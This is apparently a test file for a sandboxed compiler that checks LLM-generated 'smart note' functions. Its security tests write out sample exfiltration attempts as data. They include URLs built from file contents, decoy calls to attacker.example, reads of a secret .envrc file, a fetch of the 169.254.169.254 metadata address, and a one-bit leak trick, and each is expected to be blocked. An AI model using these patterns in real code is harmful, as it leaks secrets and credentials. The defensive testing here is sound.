import { afterEach, describe, expect, mock, test } from "bun:test";
import { readFileSync } from "node:fs";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

import type { PluginContext } from "../../../plugin/types";
import { _resetKeepSubagentsForTesting, setKeepSubagents } from "../../../shared/keep-subagents";
import { createSmartNoteCapabilities, type SmartNoteCapabilityApi } from "./capabilities";
import {
    compileSmartNoteCheck,
    enforceLiteralCapabilityArguments,
    manifestAdvisoryWarnings,
    normalizeCompiledCheck,
    normalizeCron,
    normalizeManifest,
    parseCompilerOutput,
} from "./compiler";
import { runCompiledSmartNoteCheck } from "./sandbox-runner";

const fakeCap: SmartNoteCapabilityApi = {
    readFile: async (filePath) => (filePath === "ready.txt" ? "ready" : null),
    gitHeadSha: async () => "abc123",
    gitTag: async () => "v1.2.3",
    gitLog: async () => [{ sha: "abc", subject: "initial", authorDate: "2026-01-01T00:00:00Z" }],
    httpGet: async () => ({ status: 200, body: "ok" }),
};

async function withTempDir<T>(fn: (dir: string) => Promise<T>): Promise<T> {
    const dir = await mkdtemp(path.join(tmpdir(), "eidnara-smart-note-compiler-"));
    try {
        return await fn(dir);
    } finally {
        await rm(dir, { recursive: true, force: true });
    }
}

const VALID_CHECK = `function check(cap) { return { met: cap.readFile("ready.txt") === "ready" }; }`;

function compilerOutput(compiledCheck: string): string {
    return JSON.stringify({
        compiled_check: compiledCheck,
        manifest: { capabilities: ["readFile"], readFiles: ["ready.txt"] },
        check_cron: "*/15 * * * *",
    });
}

function createCompilerClient(
    outputs: string[],
    options: { prompt?: (input: { signal?: AbortSignal }) => Promise<void> } = {},
) {
    let promptCount = 0;
    const client = {
        session: {
            create: mock(async () => ({ data: { id: "compile-child" } })),
            prompt: mock(async (input: { signal?: AbortSignal }) => {
                promptCount += 1;
                await options.prompt?.(input);
            }),
            messages: mock(async () => ({
                data: [
                    {
                        info: { role: "assistant", time: { created: Date.now() } },
                        parts: [{ type: "text", text: outputs[promptCount - 1] ?? "" }],
                    },
                ],
            })),
            abort: mock(async () => ({ data: true })),
            delete: mock(async () => ({ data: undefined })),
        },
    };
    return client as typeof client & PluginContext["client"];
}

function compileArgs(
    client: PluginContext["client"],
    overrides: Partial<Parameters<typeof compileSmartNoteCheck>[0]> = {},
) {
    return {
        client,
        parentSessionId: "ses-parent",
        sessionDirectory: "/repo/project",
        projectIdentity: "/repo/project",
        note: { id: 7, content: "ship it", surfaceCondition: "when ready.txt says ready" },
        capabilityFactory: () => fakeCap,
        signal: new AbortController().signal,
        deadline: Date.now() + 30_000,
        ...overrides,
    };
}

afterEach(() => {
    _resetKeepSubagentsForTesting();
});

describe("compileSmartNoteCheck", () => {
    test("returns before creating a session when the deadline has already passed", async () => {
        const client = createCompilerClient([compilerOutput(VALID_CHECK)]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { deadline: Date.now() - 1 }),
        );

        expect(result).toEqual({
            ok: false,
            cancelled: false,
            error: "smart-note compile deadline expired",
        });
        expect(client.session.create).not.toHaveBeenCalled();
        expect(client.session.prompt).not.toHaveBeenCalled();
    });

    test("stops at the deadline instead of giving a fallback model a fresh budget", async () => {
        const hangUntilAborted = (input: { signal?: AbortSignal }) =>
            new Promise<void>((_, reject) => {
                input.signal?.addEventListener("abort", () => reject(new Error("aborted")), {
                    once: true,
                });
            });
        const client = createCompilerClient(
            [compilerOutput(VALID_CHECK), compilerOutput(VALID_CHECK)],
            { prompt: hangUntilAborted },
        );

        const result = await compileSmartNoteCheck(
            compileArgs(client, {
                deadline: Date.now() + 50,
                fallbackModels: ["fallback/model"],
            }),
        );

        expect(result).toEqual({
            ok: false,
            cancelled: false,
            error: "smart-note compile deadline expired",
        });
        expect(client.session.prompt).toHaveBeenCalledTimes(1);
    });

    test("reports an external abort as cancelled", async () => {
        const controller = new AbortController();
        const client = createCompilerClient([compilerOutput(VALID_CHECK)], {
            prompt: async () => {
                controller.abort();
                throw new Error("aborted");
            },
        });

        const result = await compileSmartNoteCheck(
            compileArgs(client, { signal: controller.signal }),
        );

        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.cancelled).toBe(true);
    });

    test("tries a fallback model when the primary output fails normalization", async () => {
        const client = createCompilerClient([
            compilerOutput(`async function check(cap) { return { met: true }; }`),
            compilerOutput(VALID_CHECK),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, {
                model: "primary/model",
                fallbackModels: ["fallback/model"],
            }),
        );

        expect(result.ok).toBe(true);
        expect(client.session.prompt).toHaveBeenCalledTimes(2);
        const promptCalls = client.session.prompt.mock.calls as unknown as Array<
            [{ body: { model?: { providerID: string; modelID: string } } }]
        >;
        expect(promptCalls[1][0].body.model).toEqual({ providerID: "fallback", modelID: "model" });
    });

    test("tries a fallback model when the primary check fails its dry run", async () => {
        const client = createCompilerClient([
            compilerOutput(`function check(cap) { throw new Error("boom"); }`),
            compilerOutput(VALID_CHECK),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { fallbackModels: ["fallback/model"] }),
        );

        expect(result.ok).toBe(true);
        expect(client.session.prompt).toHaveBeenCalledTimes(2);
    });

    test("reports a dry-run failure when no fallback model is configured", async () => {
        const client = createCompilerClient([
            compilerOutput(`function check(cap) { throw new Error("boom"); }`),
        ]);

        const result = await compileSmartNoteCheck(compileArgs(client));

        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.cancelled).toBe(false);
            expect(result.error).toContain("dry-run failed");
        }
        expect(client.session.prompt).toHaveBeenCalledTimes(1);
    });

    test("rejects a computed httpGet URL before any code runs", async () => {
        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
        const client = createCompilerClient([
            compilerOutput(
                `function check(cap) { cap.httpGet("https://example.com/?d=" + cap.readFile("ready.txt")); return { met: true }; }`,
            ),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
        );

        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.error).toContain("must be a single string literal");
        expect(httpGet).not.toHaveBeenCalled();
    });

    test("rejects an aliased capability call before any code runs", async () => {
        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
        const client = createCompilerClient([
            compilerOutput(
                `function check(cap) { const get = cap.httpGet; get("https://example.com/?d=" + cap.readFile("ready.txt")); return { met: true }; }`,
            ),
        ]);

        const result = await compileSmartNoteCheck(
            compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
        );

        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.error).toContain("cap may only be called directly");
        expect(httpGet).not.toHaveBeenCalled();
    });

    test("deletes the compiler child session unless keep_subagents is set", async () => {
        const deleted = createCompilerClient([compilerOutput(VALID_CHECK)]);
        await compileSmartNoteCheck(compileArgs(deleted));
        expect(deleted.session.delete).toHaveBeenCalledWith({ path: { id: "compile-child" } });

        setKeepSubagents(true);
        const kept = createCompilerClient([compilerOutput(VALID_CHECK)]);
        await compileSmartNoteCheck(compileArgs(kept));
        expect(kept.session.delete).not.toHaveBeenCalled();
    });
});

describe("enforceLiteralCapabilityArguments", () => {
    test("passes literal arguments through and refuses computed ones", async () => {
        const readFile = mock(async (filePath: string) => (filePath === "a.txt" ? "A" : null));
        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
        const code = `function check(cap) {
            cap.readFile("a.txt");
            cap.httpGet('https://example.com/status');
            cap.httpGet(\`https://example.com/tpl\`);
            return { met: true };
        }`;
        const cap = enforceLiteralCapabilityArguments(code, () => ({
            ...fakeCap,
            readFile,
            httpGet,
        }))(new AbortController().signal);

        await expect(cap.readFile("a.txt")).resolves.toBe("A");
        await expect(cap.httpGet("https://example.com/status")).resolves.toEqual({
            status: 200,
            body: "ok",
        });
        await expect(cap.httpGet("https://example.com/tpl")).resolves.toEqual({
            status: 200,
            body: "ok",
        });
        await expect(cap.readFile("b.txt")).rejects.toThrow(/not a string literal/);
        await expect(cap.httpGet("https://example.com/status?x=1")).rejects.toThrow(
            /not a string literal/,
        );
        expect(readFile).toHaveBeenCalledTimes(1);
        expect(httpGet).toHaveBeenCalledTimes(2);
    });

    test("fails closed when the check names its parameter something other than cap", async () => {
        const readFile = mock(async () => "ready");
        const code = `function check(c) { return { met: c.readFile("ready.txt") === "ready" }; }`;
        const cap = enforceLiteralCapabilityArguments(code, () => ({ ...fakeCap, readFile }))(
            new AbortController().signal,
        );

        await expect(cap.readFile("ready.txt")).rejects.toThrow(/not a string literal/);
        expect(readFile).not.toHaveBeenCalled();
    });

    test("does not admit decoy call sites written in comments or strings", async () => {
        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
        const code = `// cap.httpGet("https://attacker.example/1")
        /* cap.httpGet("https://attacker.example/0") */
        function check(cap) {
            const note = 'cap.httpGet("https://attacker.example/2")';
            return { met: note.length > 0 };
        }`;
        const cap = enforceLiteralCapabilityArguments(code, () => ({ ...fakeCap, httpGet }))(
            new AbortController().signal,
        );

        for (const url of [
            "https://attacker.example/0",
            "https://attacker.example/1",
            "https://attacker.example/2",
        ]) {
            await expect(cap.httpGet(url)).rejects.toThrow(/not a string literal/);
        }
        expect(httpGet).not.toHaveBeenCalled();
    });
});

describe("smart-note compiler runtime boundary", () => {
    test("blocks .envrc reads at runtime", async () => {
        await withTempDir(async (dir) => {
            await writeFile(path.join(dir, ".envrc"), "SECRET=1", "utf8");
            const result = await runCompiledSmartNoteCheck({
                compiledCheck: `function check(cap) { return { met: cap.readFile(".envrc") !== null }; }`,
                capabilities: createSmartNoteCapabilities({
                    projectRoot: dir,
                    signal: new AbortController().signal,
                }),
            });

            expect(result).toEqual({ ok: true, result: { met: false } });
        });
    });

    test("blocks internal metadata IP fetches at runtime", async () => {
        await withTempDir(async (dir) => {
            const result = await runCompiledSmartNoteCheck({
                compiledCheck: `function check(cap) { cap.httpGet("https://169.254.169.254/latest/meta-data/"); return { met: true }; }`,
                capabilities: createSmartNoteCapabilities({
                    projectRoot: dir,
                    signal: new AbortController().signal,
                }),
            });

            expect(result.ok).toBe(false);
            if (!result.ok) expect(result.error).toContain("internal address");
        });
    });

    test("enforces sandbox time limits", async () => {
        const result = await runCompiledSmartNoteCheck({
            compiledCheck: `function check() { while (true) {} }`,
            capabilities: fakeCap,
            timeoutMs: 100,
        });

        expect(result.ok).toBe(false);
    });

    test("enforces sandbox memory limits", async () => {
        const result = await runCompiledSmartNoteCheck({
            compiledCheck: `function check() { const chunks = []; for (let i = 0; i < 100; i++) chunks.push(new ArrayBuffer(1024 * 1024)); return { met: false }; }`,
            capabilities: fakeCap,
            heapLimitBytes: 64 * 1024,
            timeoutMs: 1_000,
        });

        expect(result.ok).toBe(false);
    });

    test("does not expose the raw host capability bridge to guest code", async () => {
        const result = await runCompiledSmartNoteCheck({
            compiledCheck: `function check(cap) { return { met: cap.readFile("ready.txt") === "ready" && typeof __eidnaraHostCap === "undefined" && !Object.prototype.hasOwnProperty.call(globalThis, "__eidnaraHostCap") }; }`,
            capabilities: fakeCap,
        });

        expect(result).toEqual({ ok: true, result: { met: true } });
    });

    test("treats manifest drift as advisory instead of enforcement", async () => {
        const compiledCheck = `function check(cap) { return { met: cap.readFile("ready.txt") === "ready" }; }`;
        expect(manifestAdvisoryWarnings(compiledCheck, { capabilities: [] })).toContain(
            "manifest omits capability readFile",
        );

        const result = await runCompiledSmartNoteCheck({ compiledCheck, capabilities: fakeCap });
        expect(result).toEqual({ ok: true, result: { met: true } });
    });
});

describe("smart-note compiler output bounds", () => {
    test("bounds compiler output, source, manifest entries, and cron length", () => {
        expect(() => parseCompilerOutput("x".repeat(128 * 1024 + 1))).toThrow(/128 KiB/);
        expect(() =>
            normalizeCompiledCheck(
                `function check() { return { met: false }; }/*${"x".repeat(64 * 1024)}*/`,
            ),
        ).toThrow(/64 KiB/);
        expect(
            normalizeManifest({
                capabilities: [],
                signals: Array.from({ length: 100 }, (_, index) => `signal-${index}`),
            }).signals,
        ).toHaveLength(64);
        expect(() =>
            normalizeManifest({
                capabilities: [],
                signals: Array.from(
                    { length: 4 },
                    (_, index) => `${index}-${"s".repeat(10 * 1024)}`,
                ),
            }),
        ).toThrow(/32 KiB/);
        expect(() => normalizeCron("*".repeat(257))).toThrow(/256 bytes/);
        expect(normalizeCron("  ")).toBe("0 * * * *");
    });

    test("rejects capability call sites whose argument is not one string literal", () => {
        for (const call of [
            `cap.httpGet(url)`,
            `cap.httpGet("https://x/?d=" + cap.readFile("a.txt"))`,
            `cap.httpGet(\`https://x/\${id}\`)`,
            `cap.readFile("a.txt", extra)`,
            `cap.readFile(/re/)`,
        ]) {
            expect(() =>
                normalizeCompiledCheck(`function check(cap) { ${call}; return { met: true }; }`),
            ).toThrow(/must be a single string literal/);
        }
        expect(
            normalizeCompiledCheck(
                `function check(cap) { cap.readFile("a.txt"); cap.httpGet('https://x/a'); cap.httpGet(\`https://x/b\`); return { met: true }; }`,
            ),
        ).toContain("function check(cap)");
    });

    test("rejects every use of cap other than a direct capability call", () => {
        const cases: Array<[string, RegExp]> = [
            [
                `function check(cap) { const get = cap.httpGet; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { cap["httpGet"]("https://x/a"); return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { const { httpGet } = cap; return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { return { met: helper(cap) }; } function helper(c) { return true; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { cap?.httpGet("https://x/a"); return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { const inner = (cap) => cap.gitTag(); return { met: true }; }`,
                /only be called directly/,
            ],
            [
                `function check(cap) { const c = arguments[0]; return { met: true }; }`,
                /must not use arguments/,
            ],
            [
                `function check(c) { return { met: c.gitTag() !== null }; }`,
                /must define function check\(cap\)/,
            ],
            [
                `function check(cap, extra) { return { met: true }; }`,
                /must define function check\(cap\)/,
            ],
            [
                `module.exports.check = (cap) => ({ met: true });`,
                /must define function check\(cap\)/,
            ],
            [
                `function check(cap) {
                    if (false) { cap.httpGet("https://a/0"); cap.httpGet("https://a/1"); }
                    const g = cap.httpGet;
                    const bit = (cap.readFile("config.txt") || "").length % 2;
                    g(bit ? "https://a/1" : "https://a/0");
                    return { met: true };
                }`,
                /only be called directly/,
            ],
        ];
        for (const [code, error] of cases) {
            expect(() => normalizeCompiledCheck(code)).toThrow(error);
        }
        expect(
            normalizeCompiledCheck(
                `function check(cap) { const tag = cap.gitTag(); const log = cap.gitLog({ maxCount: 3 }); return { met: tag !== null && log.length > 0 && cap.gitHeadSha() !== null }; }`,
            ),
        ).toContain("function check(cap)");
    });

    test("strips export only from the declaration, not from string data", () => {
        const declaration = `export function check(cap) { return { met: true }; }`;
        expect(normalizeCompiledCheck(declaration)).toBe(
            `function check(cap) { return { met: true }; }`,
        );
        const data = `function check(cap) { return { met: (cap.readFile("source.js") || "").includes("export function check(") }; }`;
        expect(normalizeCompiledCheck(data)).toBe(data);
    });

    test("ignores module keywords and call-like text inside strings and comments", () => {
        const code = `// import nothing; cap.httpGet("https://decoy.example/comment")
function check(cap) {
  /* require("fs") is only mentioned here */
  const source = cap.readFile("source.js") || "";
  if (source) /import\\s/.test(source);
  const usesCommonJs = source.includes("require") || /require\\(/.test(source);
  return { met: usesCommonJs && !source.includes("cap.readFile(\\"decoy\\")") };
}`;
        expect(normalizeCompiledCheck(code)).toBe(code);
        expect(manifestAdvisoryWarnings(code, { capabilities: ["readFile"] })).toEqual([
            "manifest omits readFile path source.js",
        ]);
    });

    test("decodes escape sequences in literal capability arguments", () => {
        const code = `function check(cap) { return { met: cap.readFile("docs\\u002Fa\\x2Db\\n.txt") !== null }; }`;
        expect(manifestAdvisoryWarnings(code, { capabilities: ["readFile"] })).toEqual([
            "manifest omits readFile path docs/a-b\n.txt",
        ]);
    });
});

describe("wire-limit parity with the Rust module (static)", () => {
    const tsSource = readFileSync(path.join(import.meta.dir, "compiler.ts"), "utf8");
    const rustSource = readFileSync(
        path.join(import.meta.dir, "../../../../../../crates/daemon/src/lib.rs"),
        "utf8",
    );

    test("MAX_MANIFEST_BYTES matches NOTE_EVALUATOR_MAX_MANIFEST_BYTES", () => {
        // TypeScript must reject manifests larger than the module limit.
        const tsLimit = tsSource.match(/const MAX_MANIFEST_BYTES = (.+);/)?.[1];
        const rustLimit = rustSource.match(
            /const NOTE_EVALUATOR_MAX_MANIFEST_BYTES: usize = (.+);/,
        )?.[1];
        expect(tsLimit).toBeDefined();
        expect(rustLimit).toBeDefined();
        expect(tsLimit).toBe(rustLimit);
    });

    test("MAX_CRON_BYTES matches NOTE_EVALUATOR_MAX_CRON_BYTES", () => {
        const tsLimit = tsSource.match(/const MAX_CRON_BYTES = (.+);/)?.[1];
        const rustLimit = rustSource.match(
            /const NOTE_EVALUATOR_MAX_CRON_BYTES: usize = (.+);/,
        )?.[1];
        expect(tsLimit).toBeDefined();
        expect(rustLimit).toBeDefined();
        expect(tsLimit).toBe(rustLimit);
    });

    test("MAX_COMPILED_CHECK_BYTES matches NOTE_EVALUATOR_MAX_COMPILED_CHECK_BYTES", () => {
        const tsLimit = tsSource.match(/const MAX_COMPILED_CHECK_BYTES = (.+);/)?.[1];
        const rustLimit = rustSource.match(
            /const NOTE_EVALUATOR_MAX_COMPILED_CHECK_BYTES: usize = (.+);/,
        )?.[1];
        expect(tsLimit).toBeDefined();
        expect(rustLimit).toBeDefined();
        expect(tsLimit).toBe(rustLimit);
    });
});
